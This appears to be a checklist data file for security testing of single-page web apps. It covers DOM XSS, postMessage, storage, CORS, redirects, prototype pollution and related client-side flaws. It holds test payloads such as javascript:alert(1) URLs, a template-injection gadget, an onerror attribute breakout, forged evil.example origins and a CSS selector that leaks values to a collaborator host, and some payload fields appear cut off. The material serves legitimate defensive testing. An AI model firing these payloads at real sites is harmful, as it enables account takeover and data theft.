title: SPA / client-side
summary: DOM XSS from the URL, postMessage, browser storage, client-only authorization, secrets in the bundle, CORS, and client redirects.

groups.title: DOM sinks
groups.summary: location, postMessage, and storage into HTML / eval / navigation.

checks.title: DOM XSS from the URL
checks.why: hash, search, or a path segment is written into innerHTML, eval, or a javascript: URL.
checks.validate: A marker in the URL executes in the real app shell.

variants.name: Hash to HTML
variants.payload: https://www.example.com/#\nhttps://www.example.com/?q=
variants.expect: Grep the bundle for location.hash, location.search, document.write, innerHTML, insertAdjacentHTML.
variants.why: A hash fragment written into innerHTML is a DOM-XSS sink reachable without a server round-trip.

variants.name: javascript: navigation
variants.payload: https://www.example.com/#javascript:alert(1)\nhttps://www.example.com/?next=javascript:alert(1)
variants.expect: Must not become location.href / window.open. data:text/html,… is the same class.
variants.why: A javascript: URL assigned to location/window.open executes in the page.

variants.name: Template sink
variants.payload: https://www.example.com/#{{constructor.constructor('alert(1)')()}}
variants.expect: Client-side template injection (Angular/Vue/Mavo gadgets) after you confirm the sink.
variants.why: Client-side template renderers re-parse attacker input into HTML.

checks.title: postMessage origin checks
checks.why: The app listens for message and trusts event.data without checking event.origin.
checks.validate: A page you control can drive a sink or an authenticated action.

variants.name: Listener inventory
variants.payload: addEventListener('message', …)\nonmessage = …
variants.expect: For each listener, record whether origin is compared to an exact allowlist (===, not indexOf).
variants.why: Enumerating message listeners shows which handlers trust event.data.

variants.name: Drive from a child window
variants.payload: <script>const w = window.open('https://www.example.com/app');\nsetTimeout(() => w.postMessage({type:'setToken', token:'wapt'}, '*'), 1500);</script>
variants.expect: Must be ignored. A token or HTML sink accepting this is the finding. Use a test account.
variants.why: A child/opener frame sends a message to confirm an origin-unchecked handler.

checks.title: Browser storage as input and secret store
checks.why: A JWT or role in localStorage is writable, and a stored value later hits a sink.
checks.validate: Writing a marker into storage and reloading either escalates privilege or executes script.

variants.name: Token / role in localStorage
variants.payload: localStorage.setItem('role','admin')\nlocalStorage.setItem('token','<edited-jwt>')
variants.expect: Reload. Client-only role changes are presentational if the API refuses; a working admin view against a member API is still a finding if it discloses data.
variants.why: A token or role in localStorage is readable by any script and survives logout.

variants.name: Storage → sink
variants.payload: localStorage.setItem('name','') then reload / navigate.
variants.expect: If name is dropped into innerHTML, that is DOM XSS. Treat storage as untrusted input.
variants.why: A value read from storage into a sink can be attacker-controlled via the same storage key.

groups.title: Trust and origin
groups.summary: The bundle is public. The API is the control.

checks.title: Client-only authorization
checks.why: Routes and buttons are hidden in the SPA but the API still answers.
checks.validate: A member token on an admin API route succeeds. The hidden button is not the finding.

variants.name: Call the hidden route
variants.payload:
GET /api/v1/admin/users HTTP/1.1
Host: api.example.com
Authorization: Bearer <member-token>
variants.expect: 403/404. Repeat any path you grepped from the bundle (admin, internal, debug, impersonate).
variants.why: A route hidden in the UI but served without a server check is client-only authorization.

variants.name: Feature-flag in localStorage
variants.payload: localStorage.setItem('flags','{"admin":true}') or ?ff=admin
variants.expect: If the UI appears but the API refuses, record as informational. If the API obeys the flag, that is the finding.
variants.why: A feature flag stored in localStorage can be flipped to reveal admin UI.

checks.title: Secrets in the JavaScript bundle
checks.why: The published bundle contains a live privileged secret, not a public site key.
checks.validate: A retrieved value authenticates as a privileged identity or signs a privileged request.

variants.name: Grep the bundle
variants.payload: api[_-]?key|secret|password|token|AKIA[0-9A-Z]{16}|sk_live_|ghp_|xox[baprs]-|Bearer [A-Za-z0-9._-]+
variants.expect: Confirm any hit is a live credential, not a public Stripe pk_ or a Mapbox token.
variants.why: Secret patterns in the published bundle are the first-pass disclosure check.

variants.name: Source map
variants.payload:
GET /assets/index-*.js.map HTTP/1.1
Host: www.example.com
Connection: close
variants.expect: A map with sourcesContent is a lead. Embedded secrets or internal URLs are the finding.
variants.why: A source map reconstructs original source and may embed secrets or internal URLs.

checks.title: CORS on the API origin
checks.why: A reflected ACAO plus credentials lets another origin read the API with the victim's cookies.
checks.validate: A controlled origin can read a non-public body with credentials.

variants.name: Reflected Origin with cookies
variants.payload:
GET /api/v1/me HTTP/1.1
Host: api.example.com
Origin: https://evil.example
Cookie: session=<account-A>
variants.expect: ACAO: https://evil.example and ACAC: true together are the finding if the body is the user.
variants.why: A reflected ACAO with credentials lets another origin read the response.

variants.name: null / regex mistakes
variants.payload:
GET /api/v1/me HTTP/1.1
Host: api.example.com
Origin: https://www.example.com.evil.example
Cookie: session=<account-A>
variants.expect: Substring and endsWith('example.com') allowlists fail this way. Also try Origin: null.
variants.why: null and substring/regex allowlists fail to restrict the reading origin.

checks.title: Client-side open redirect
checks.why: next=, return=, or a router push accepts an absolute or javascript: URL.
checks.validate: The SPA navigates off-origin or into a javascript: URL.

variants.name: Absolute next
variants.payload: https://www.example.com/login?next=https://evil.example/\nhttps://www.example.com/login?next=//evil.example/
variants.expect: After login the shell must stay on-origin. Watch location.assign / href / router.push.
variants.why: A client-side navigation accepting an absolute URL is an open redirect.

variants.name: javascript: next
variants.payload: https://www.example.com/login?next=javascript:alert(1)
variants.expect: Must be rejected. This is XSS, not just a redirect.
variants.why: A javascript: next URL in a client-side redirect is a DOM-XSS sink.

checks.title: DOM sources traced into dangerous sinks
checks.why: DOM XSS lives where untrusted sources (URL, postMessage, storage) reach sinks (innerHTML, eval, event handlers) — map before exploiting.
checks.validate: Every source-to-sink path is enumerated; each ends in safe rendering or is a finding with a reproduction.

variants.name: Sink inventory
variants.payload: Grep bundles for sinks: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, new Function, setTimeout(string), jQuery $() with html.
variants.expect: Sink list mapped to reachable code paths and the sources feeding them.
variants.why: The map is the deliverable; each sink gets a verdict.

variants.name: URL-to-DOM probe
variants.payload: For each reflected parameter and hash fragment, feed a harmless canary marker and watch DOM insertion points.
variants.expect: Markers render as text everywhere; any HTML execution is a finding with the exact path.
variants.why: Canary markers prove execution without payloads.

variants.name: Sink-reach triage
variants.payload: For each sink, trace backwards to the source; classify reachable vs dead code.
variants.expect: Findings only for live paths — dead sinks documented, not inflated.
variants.why: Precision keeps DOM XSS reports credible.

checks.title: No dynamic evaluation of untrusted strings
checks.why: eval/new Function on request-influenced strings is script execution by construction — no sanitizer survives it.
checks.validate: No eval-family sink receives untrusted input; legitimate dynamic code comes from static, integrity-protected sources.

variants.name: Eval census
variants.payload: Grep bundles for eval(, new Function(, setTimeout/setInterval with string args, and script-tag injection of request text.
variants.expect: Each site receives constants only; any taint traced to source is a finding.
variants.why: Few sites, decisive verdicts.

variants.name: JSONP legacy
variants.payload: Look for callback= parameters and script src built from requests.
variants.expect: No request-built script sources; JSONP replaced by CORS JSON.
variants.why: JSONP is eval wearing a callback.

variants.name: Template-string injection
variants.payload: Template literals interpolating URL/storage data into code or html strings.
variants.expect: Interpolations render-only; code contexts are constants.
variants.why: Backticks are the new eval when mixed with innerHTML.

checks.title: Non-script HTML injection assessed for impact
checks.why: Injecting markup without script execution still matters: defacement, credential forms, dangling-markup exfiltration, attribute injection.
checks.validate: HTML injection points are assessed for concrete impact (forms, links, style-based exfil, attribute escapes) rather than auto-dismissed.

variants.name: Dangling-markup probe
variants.payload: At an HTML injection point, inject an unclosed tag plus
variants.expect: No cross-origin capture of following content; injection neutralized or escaped.
variants.why: Exfiltration without script — classic dangling markup.

variants.name: Attribute escape
variants.payload: Inject " onerror=alert(1) x=" and event-handler fragments at attribute-reflection points.
variants.expect: Quotes and angle brackets escaped contextually; no attribute breakout.
variants.why: Attribute contexts need their own escaping.

variants.name: Fake-UI injection
variants.payload: Inject a credential-looking form or login banner at a visible injection point.
variants.expect: Either neutralized or assessed as UI-redressing impact for the report.
variants.why: Impact sometimes is the interface itself.

checks.title: CSS injection and UI redressing constrained
checks.why: Injected CSS can exfiltrate attribute values character-by-character and redress the UI into a trap.
checks.validate: No untrusted input reaches style contexts without escaping; UI-critical elements resist overlay attacks.

variants.name: Attribute exfil probe
variants.payload: At a style injection point, inject selectors like input[value^=a]{background:url(//collaborator/a)} shapes (own account).
variants.expect: No selector-based secret exfiltration; style contexts escaped.
variants.why: CSS is a slow but reliable reader.

variants.name: Overlay redressing
variants.payload: Where input lands in styles, attempt to reposition a login form or button over your own test element.
variants.expect: No meaningful redressing; combined with framing assessment.
variants.why: Pairs with clickjacking checks.

variants.name: Style sink census
variants.payload: Grep for .style[prop]=, cssText, insertRule, and jQuery .css() fed by request data.
variants.expect: Enumerated and escaped; dynamic theming uses safe APIs.
variants.why: The census finds the paths testing confirms.

checks.title: Client-side resource URL manipulation prevented
checks.why: Script and endpoint URLs chosen from URL parameters load attacker code or point data exfiltration elsewhere.
checks.validate: Resource and endpoint URLs come from configuration/allowlists; request data cannot choose script sources or API base URLs.

variants.name: Script-src parameter hunt
variants.payload: Look for lazy-loading of scripts whose src includes request data (redirect params, widget URLs, locale).
variants.expect: Request data never selects script origins; allowlists only.
variants.why: Client-side SSRF is code execution.

variants.name: API-base override
variants.payload: Check for ?api= / ?endpoint= style parameters influencing fetch targets; point one at your Collaborator.
variants.expect: Base URLs fixed; no request-driven API targets (watch for data reaching your Collaborator).
variants.why: Exfiltration by configuration.

variants.name: Open-redirect-to-script chain
variants.payload: Where open redirects exist, chain them into script-src or OAuth redirect contexts (in-scope only).
variants.expect: Redirects cannot feed loader or OAuth contexts — chained impact reported with the redirect.
variants.why: Redirects are loaders sometimes.

checks.title: CORS enforcement matches real client behavior
checks.why: The header says one thing; the client does another — credentialed cross-origin behavior is what attackers actually use.
checks.validate: Credential-bearing requests only to intended origins; CORS policy matches observed client behavior; no wildcard+credentials.

variants.name: Origin reflection
variants.payload: Send Origin: https://evil.example with credentials on a data endpoint; read ACAO/ACAC.
variants.expect: Exact allowlisted origins; no reflection; never * with credentials.
variants.why: The API check, run against the app the client actually uses.

variants.name: Client target census
variants.payload: From the browser, log every fetch/XHR target and credentials mode on the authenticated app.
variants.expect: All credentialed targets are first-party origins.
variants.why: The map of what the page trusts.

variants.name: Subdomain trust probe
variants.payload: Check whether sibling subdomains you control (in scope) are allowed origins.
variants.expect: Siblings allowed only with a documented, hardened reason.
variants.why: Sibling trust extends your attack surface to the weakest subdomain.

checks.title: postMessage replies to validated exact origins
checks.why: Replying with sensitive data to "*" or unvalidated origins hands it to any page that embeds or opens you.
checks.validate: Every postMessage send targets an exact validated origin; receives validate origin and shape; no wildcard replies with data.

variants.name: Embed-and-listen
variants.payload: Embed the app (or its widget frame) in your test origin; listen for messages it posts.
variants.expect: No sensitive payloads arrive at arbitrary parent origins; targets are exact.
variants.why: Be the malicious parent, harmlessly.

variants.name: Message-flood probe
variants.payload: Send unexpected message shapes (missing type, wrong types, giant strings) to its listeners.
variants.expect: Listeners validate shape and source; no errors leak, no handlers fire dangerously.
variants.why: Unhandled messages crash into gadgets.

variants.name: Origin-check census
variants.payload: Grep bundles for postMessage( and compare targetOrigin arguments.
variants.expect: No "*" sends with data; receive handlers check event.origin.
variants.why: Static truth beats runtime luck.

checks.title: Browser storage treated as untrusted input
checks.why: localStorage and cookies are readable/writable by any XSS and by users — parsing them as code or truth is self-inflicted.
checks.validate: Storage values are validated, escaped on use, and never influence code paths or security decisions.

variants.name: Storage canary tamper
variants.payload: Write canary markup into each stored key; reload and observe rendering.
variants.expect: Values render as inert text; no execution from storage-borne markup.
variants.why: Your own profile field is the honest canary.

variants.name: JSON-shape fuzz
variants.payload: Swap stored JSON for arrays, huge strings, wrong types; reload.
variants.expect: Schema-validated with safe errors; no exceptions leaking internals.
variants.why: Crash-only bugs still leak behavior.

variants.name: Decision-field probe
variants.payload: Flip privilege-ish stored flags (role, isAdmin, plan) and reload.
variants.expect: Client decisions cosmetic only; server re-authorizes everything.
variants.why: Storage is the client-side mass-assignment surface.

checks.title: IndexedDB partitioned by identity and tenant
checks.why: A shared client database mixes tenants and accounts — logout/user-switch then reads the previous identity's records.
checks.validate: Client databases are namespaced or keyed by identity/tenant; switching clears or separates data.

variants.name: Cross-account canary
variants.payload: As account A (tenant 1), create records with a canary; switch to account B (or tenant 2); enumerate databases/records.
variants.expect: B sees none of A's records — separate DBs or filtered queries.
variants.why: The client-side tenant boundary.

variants.name: Logout residue
variants.payload: Log out; enumerate IndexedDB again.
variants.expect: Per-user data cleared or invalidated; no authed reads possible from stale rows.
variants.why: Left-behind rows are tomorrow's leak.

variants.name: Quota-clobber probe
variants.payload: Fill storage toward quota with own records; observe app behavior.
variants.expect: Graceful quota errors; no eviction that exposes another context's data.
variants.why: Eviction policy is a privacy policy.

checks.title: Service-worker caches free of stale private data
checks.why: A service worker outliving the session serves authenticated pages to the next user of the machine — and to offline attackers.
checks.validate: Caches exclude authenticated/private responses; logout invalidates caches; worker updates cannot serve stale authority.

variants.name: Cache inventory
variants.payload: DevTools → Application → Cache Storage/Service Worker on the authed app; list cached URLs.
variants.expect: Private/authenticated responses not cached (or explicitly invalidated).
variants.why: The inventory is the finding generator.

variants.name: Logout cache replay
variants.payload: Log out; with the worker active, request a previously cached authenticated page offline/online.
variants.expect: Stale authed content never served after logout.
variants.why: The next-user scenario, run by you.

variants.name: Update race
variants.payload: Trigger a worker update; check old worker serving during the swap.
variants.expect: No window where revoked content is served; versioned caches swapped atomically.
variants.why: Workers run in the past sometimes.

checks.title: Worker message boundaries validated
checks.why: Workers hold tokens and perform privileged fetches; their message APIs are an unauthenticated input channel when unvalidated.
checks.validate: Worker/shared-worker message handlers validate origin, shape, and authorization; no privileged action from bare messages.

variants.name: Message-flood probe
variants.payload: postMessage arbitrary shapes, wrong types, and prototype-pollution strings ({__proto__: {...}}) to the worker.
variants.expect: Rejected safely; no crash, no gadget, no pollution reaching merges.
variants.why: Workers get less security attention than windows.

variants.name: Privilege-call probe
variants.payload: Send messages that request privileged operations (token fetch, admin data) directly.
variants.expect: Worker authorizes per documented policy; it is a server proxy, not a privilege oracle.
variants.why: The worker is staff; treat its inbox accordingly.

variants.name: SharedWorker cross-context
variants.payload: If SharedWorker connects multiple tabs/contexts, message one context into another (your own tabs).
variants.expect: Context isolation maintained; no cross-account message bleed.
variants.why: Shared means shared unless partitioned.

checks.title: BroadcastChannel isolated by context
checks.why: Same-origin channels shout to every context — cross-account or cross-tenant tabs receive each other's events.
checks.validate: Channels namespaced per app/account context; no sensitive payloads on shared channels.

variants.name: Channel census
variants.payload: Grep bundles for new BroadcastChannel( names; map what is posted.
variants.expect: Namespaced names; payloads free of tokens and personal data.
variants.why: The census decides the blast radius.

variants.name: Cross-tab canary
variants.payload: With accounts A and B open in two tabs, trigger events as A and listen as B.
variants.expect: B receives nothing account-specific; events are context-filtered.
variants.why: The multi-account user is the honest test.

variants.name: Eavesdrop on self
variants.payload: From a plain page on the same origin (test page), subscribe to app channels.
variants.expect: Nothing sensitive arrives at unauthenticated contexts.
variants.why: Any same-origin page is a subscriber.

checks.title: Prototype pollution traced to security gadgets
checks.why: Pollution alone is a curiosity; pollution reaching gadgets (innerHTML sinks, bypass flags, privilege checks) is exploitation.
checks.validate: Every pollutable merge path is mapped to reachable gadgets; each chain is demonstrated or the path is closed.

variants.name: Merge-point census
variants.payload: Find recursive/deep merges, query-string-to-object parsers, and JSON paths assigning to __proto__/constructor.prototype.
variants.expect: Census of sinks; each validated to reject prototype keys.
variants.why: The map precedes the chain.

variants.name: Gadget chain demo
variants.payload: At a confirmed pollution point, set a canary property consumed by a documented gadget (a config flag you can observe).
variants.expect: Chain demonstrated with your own observable; no real user impact.
variants.why: A chain you can show is a chain they will fix.

variants.name: Payload-key blacklist note
variants.payload: Check libraries for known pollution CVEs and their status.
variants.expect: Dependencies patched or mitigated; findings cited with versions.
variants.why: Known CVEs make the report concrete.

checks.title: DOM clobbering of trusted variables prevented
checks.why: Injected markup with id/name attributes can shadow globals the app trusts (window.config, form.action) — variables lie.
checks.validate: Trusted globals cannot be shadowed by DOM ids/names; lookups use safe access patterns.

variants.name: Shadow probe
variants.payload: At any HTML injection point, inject / style shadows for globals found in the bundle.
variants.expect: No shadowing effect on app behavior; lookups resist clobbering.
variants.why: Named elements become globals — old spec, live bug.

variants.name: Global census
variants.payload: Grep bundles for window.X / bare global reads that intersect with DOM-created globals (document.forms, ids in use).
variants.expect: No collisions between DOM names and trusted globals.
variants.why: The intersection list is the risk list.

variants.name: Form-action clobber
variants.payload: Inject a form element clobbering a form reference the submit code uses.
variants.expect: Submission targets unaffected; references are explicit.
variants.why: Classic clobber-to-CSRF-bypass shape.

checks.title: window.name cleared across navigation boundaries
checks.why: window.name persists across cross-origin navigations — data stashed by one site is read by the next: a free cross-site channel.
checks.validate: Nothing security-relevant is stored in window.name; apps reading it validate and clear it on load.

variants.name: Persist probe
variants.payload: Set window.name on your test page to a canary; navigate to the app; read window.name there.
variants.expect: Empty or inert on arrival; the app clears/ignores it.
variants.why: The channel is real; the app decides if it is used.

variants.name: Writer hunt
variants.payload: Grep bundles for window.name assignments.
variants.expect: No tokens, redirect targets, or state written to it.
variants.why: If they write it, someone will read it.

variants.name: Cross-tab read
variants.payload: Open the app via window.open from your test page with a set name; observe consumption.
variants.expect: Name treated as untrusted input or unused.
variants.why: The opener hands you the previous site's note.

checks.title: Reverse tabnabbing from external links
checks.why: External links without noopener hand the foreign page an opener reference to your authenticated tab.
checks.validate: All external target=_blank links carry rel=noopener/noreferrer (or COOP covers the surface).

variants.name: Link census
variants.payload: Grep rendered DOM for target=_blank without rel=noopener; include user-content-generated links.
variants.expect: All external blanks carry noopener; internal ones may use named access deliberately.
variants.why: The census is one devtools query.

variants.name: Opener probe
variants.payload: Click an external link to your test page; from there attempt opener.location change.
variants.expect: No opener access — cannot touch your app tab.
variants.why: The exploit is one line; so is the fix.

variants.name: User-content links
variants.payload: Check links rendered from stored user content (descriptions, comments) for the same flaw.
variants.expect: Sanitizer adds noopener to user links.
variants.why: Sanitizers forget rel more than they forget tags.

checks.title: SRI on stable cross-origin assets
checks.why: Pinned third-party scripts with integrity hashes stop a compromised CDN from becoming your XSS.
checks.validate: Stable cross-origin scripts/styles carry integrity + crossorigin; only versioned (never latest) URLs are pinned.

variants.name: Third-party census
variants.payload: List cross-origin script/style tags; check integrity and crossorigin attributes.
variants.expect: Stable assets pinned; un-pinnable (latest-tag) dependencies flagged for the report.
variants.why: The census decides what is protectable.

variants.name: Version pinning check
variants.payload: Note whether third-party URLs are version-locked or floating (latest).
variants.expect: Versioned URLs; floating tags cannot have stable SRI.
variants.why: Floating + integrity is a contradiction.

variants.name: Tamper self-check
variants.payload: Safely verify: change one hash character in devtools on a test page copy; the asset must refuse to run.
variants.expect: Refusal proves enforcement is on.
variants.why: Proof the attribute works in this context.

checks.title: Cross-site script inclusion data disclosure
checks.why: If authenticated JSON/JS endpoints can be included as scripts, any site reads them via error messages or Array-overrides.
checks.validate: Data endpoints are not valid script sources: content-types, prefixed JSON (while(1)), and Array/JSON override protections.

variants.name: Script-include probe
variants.payload: From your test origin, <script src="https://app.example.com/api/me"> and observe parse errors in console.
variants.expect: No data exposure via error messages; while(1)/prefix blocks parsing; JSON content-type prevents execution.
variants.why: The console is the exfil channel.

variants.name: Array-override probe
variants.payload: Predefine Array/Object hooks before including the endpoint as a script.
variants.expect: Modern defenses (prefix, content-type) make override tricks inert.
variants.why: Old trick, still worth one probe.

variants.name: Endpoint census
variants.payload: List endpoints returning JSON without script-hostile prefixes or correct headers.
variants.expect: Authenticated data endpoints all defended; list for the report.
variants.why: Defense belongs on every JSON route.

checks.title: Source maps reviewed without client-code fearmongering
checks.why: Readable client code is not a vulnerability — but sourcemaps sometimes contain secrets, internal URLs, and dead admin code.
checks.validate: Public sourcemaps contain no secrets, credentials, internal endpoints, or unreleased feature logic; exposure is a conscious choice.

variants.name: Map hunt
variants.payload: Check //# sourceMappingURL= references; fetch maps; search for secret patterns (key, token, password, internal hostnames, .test/.internal URLs).
variants.expect: No secrets or internal topology in maps; findings only for real leaks.
variants.why: Facts over reflexes: code visibility is expected.

variants.name: Dead-privilege code
variants.payload: Scan original sources for admin/debug functions not reachable in the UI.
variants.expect: Unreleased functions noted as dark-surface (pairs with API deny-by-default checks).
variants.why: Maps are the roadmap to dark routes.

variants.name: Secret-pattern sweep
variants.payload: Grep original sources for AKIA/sk_/bearer literals and hardcoded endpoints.
variants.expect: Zero live secrets; any hit verified harmlessly and reported.
variants.why: The one true sourcemap vulnerability class.

checks.title: Web Crypto without exported or hard-coded keys
checks.why: Client-held encryption keys protect nothing if exportable, hard-coded, or extractable — and pretend otherwise is worse than nothing.
checks.validate: Crypto uses non-extractable Web Crypto keys where possible; no hard-coded secrets; client crypto never treated as trust boundary.

variants.name: Key census
variants.payload: Grep for crypto.subtle usage, CryptoKey handling, JWK embeds, and hardcoded key material.
variants.expect: Keys generated non-extractable for in-browser use; no embedded JWKs/secrets.
variants.why: Find where crypto actually lives.

variants.name: Extraction probe
variants.payload: At a crypto-using flow (own account), attempt to export the key via subtle.exportKey in console.
variants.expect: Non-extractable keys refuse; extractable keys documented with their role.
variants.why: The API tells you the design intent.

variants.name: Trust-boundary review
variants.payload: Identify what the client crypto claims to protect; check the server still enforces it.
variants.expect: Client crypto is defense-in-depth only; server-side enforcement confirmed.
variants.why: Honest threat modeling beats client-side safes.

checks.title: Cross-site leak channels against authenticated state
checks.why: Frame counting, error events, cache timing, and status oracles let other sites ask yes/no questions about your users.
checks.validate: Authenticated state does not answer cross-site questions: framing blocked, responses uncacheable where state-dependent, error shapes uniform.

variants.name: Frame-count oracle
variants.payload: From your test origin, attempt to frame authed vs unauthed routes and count loads/errors.
variants.expect: No differential signal; COOP/frame-ancestors close the channel.
variants.why: The simplest XS-Leak is a frame.

variants.name: Resource-timing probe
variants.payload: Measure timing of authed resources cross-origin (your test page, own account).
variants.expect: No reliable state-dependent timing signal; Timing-Allow-Origin absent.
variants.why: Measure honestly, report deltas with error bars.

variants.name: Error-shape oracle
variants.payload: Cross-site load script/img against endpoints that 403 authed vs 404 unauthed.
variants.expect: Uniform status shapes where concealment matters (pairs with existence-oracle checks).
variants.why: Status codes are answers to questions.

checks.title: Sensitive state and bfcache/session history
checks.why: Back-forward cache and session history resurrect authenticated snapshots after logout — shared machines serve the previous user.
checks.validate: Pages with sensitive snapshots handle pageshow/persisted, clear state on unload where needed, and no authed data survives logout.

variants.name: BFCache replay
variants.payload: Navigate into an authed page, log out in another tab, then Back; observe the snapshot.
variants.expect: Stale authed content not actionable (data blurred, expired, or refetched with re-auth).
variants.why: The real user flow: logout then back button.

variants.name: pageshow handler check
variants.payload: Inspect for pageshow/persisted handling in bundles.
variants.expect: Deliberate handling exists (refresh or invalidate on persisted).
variants.why: One event decides correctness.

variants.name: History sweep
variants.payload: Check history entries for data-bearing URLs (tokens in fragments) after logout.
variants.expect: No credential URLs retained in session history.
variants.why: History is storage nobody sweeps.
